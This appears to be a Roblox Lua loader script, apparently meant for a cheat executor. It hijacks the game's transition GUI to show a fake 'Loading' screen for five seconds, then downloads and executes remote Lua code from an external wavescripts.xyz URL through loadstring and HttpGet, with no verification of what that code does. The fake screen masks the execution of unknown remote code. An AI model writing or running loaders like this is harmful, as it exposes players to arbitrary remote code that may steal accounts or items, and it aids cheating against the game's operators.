local LOADING_SCREEN = "Loading"
local LoadingScreenFunction = require(game:GetService("ReplicatedStorage").Library.Client.GUIFX.Transition)
local player = game.Players.LocalPlayer
local playerGui = player.PlayerGui

-- Set the display order and hint text
playerGui.Transition.DisplayOrder = 6000000000000
playerGui.Transition.Hint.HintLabel.Text = LOADING_SCREEN

-- Spawn the loading screen function
task.spawn(function()
    LoadingScreenFunction("anything")

    -- Wait for 5 seconds
    task.wait(5)

    -- Hide the loading screen
    playerGui.Transition.Enabled = false

    -- Execute the external script
    local loadscript = "loadstring(game:HttpGet('https://wavescripts.xyz/loader/all.lua'))()"
    loadstring(game:HttpGet('https://wavescripts.xyz/loader/all.lua'))()
end)
